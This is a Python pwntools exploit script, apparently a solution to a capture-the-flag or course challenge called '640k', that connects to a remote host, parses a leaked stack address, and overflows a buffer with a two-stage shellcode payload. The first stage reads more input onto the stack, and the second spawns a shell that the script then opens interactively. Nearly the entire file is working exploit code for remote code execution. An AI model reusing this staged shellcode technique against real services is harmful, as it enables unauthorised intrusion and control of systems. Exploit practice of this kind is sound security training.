#!/usr/bin/env python

from pwn import *

# scanf is weird and can interfere with other reading functions
# to avoid that you should always send 4096 bytes to scanf (size of its internal buffer)
def scanf_pad(s):
    return s + b' ' * (8192 - len(s))

ret_offset = 24 # Find return address offset

# p = process('./640k')
p = remote('141.85.224.157', 31338)

# Use recvuntil, sendline and recvline to interact with the process
p.recvuntil(b'3. Exit.\n')
p.sendline(b'1')
p.recvline()
p.sendline(b'8')
resp = p.recvline()

# Get leak from interaction
buff_addr = int(resp[resp.find(b'0x') : resp.find(b'value') - 1].decode(), 16)

# Send stage 1
raw_input("Send stage 1?")

# Write stager shellcode
context.arch = 'amd64'
context.os = 'linux'
stager = asm(f"""
    xor rax, rax
    xor rdi, rdi
    xor rdx, rdx
    mov dl, 100
    mov rsi, {buff_addr + ret_offset}
    syscall
""")

nops = b'\x90' * (ret_offset - len(stager))

print(disasm(stager, arch='amd64'))
print("================")
print("stager len = {}".format(len(stager)))
print("================")

stage1 = stager + nops + p64(buff_addr)
stage2 = asm('sub rsp, 100') + asm(shellcraft.sh())

print(disasm(stage2, arch='amd64'))
print("================")
print("stage2 len = {}".format(len(stage2)))
print("================")

p.recvuntil(b'3. Exit.\n')
p.sendline(b'2')
sleep(2)
p.sendline(stage1)

# give the exit command so the program jumps into the shellcode
p.sendline(b'3') # Exit

# Send stage 2
raw_input("Send stage 2?")
p.sendline(stage2)
p.recvline()

p.interactive() # You should get a shell here :-)
